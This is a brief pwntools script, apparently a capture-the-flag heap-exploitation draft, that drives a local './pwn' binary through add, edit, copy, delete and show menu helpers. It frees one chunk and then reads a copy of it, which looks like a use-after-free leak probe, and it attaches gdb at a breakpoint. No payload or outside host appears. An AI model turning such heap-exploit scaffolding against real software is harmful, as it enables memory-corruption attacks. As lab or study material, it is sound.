from pwn import *
context.log_level="debug"
sh=process("./pwn")
def cmd(c):
    sh.sendlineafter(b"> ", str(c).encode())
def add(size):
    cmd(1)
    sh.sendlineafter(b"size: ", str(size).encode())
def dele(idx):
    cmd(5)
    sh.sendlineafter(b"index: ", str(idx).encode())
def copy(f,t):
    cmd(3)
    sh.sendlineafter(b"from: ", str(f).encode())
    sh.sendlineafter(b"to: ", str(t).encode())
def show(idx):
    cmd(4)
    sh.sendlineafter(b"index: ", str(idx).encode())
def edit(idx,ctt):
    cmd(2)
    sh.sendlineafter(b"index: ", str(idx).encode())
    sh.sendlineafter(b"content: ", ctt)
add(0x480-1) #0
add(0x10) #1
edit(0,b'alsjdflakjslfjsl')
for i in range(16):
    copy(0, i+2)
gdb.attach(sh,"b *$rebase(0x01752)\nc")
dele(0)
show(2)
sh.interactive()
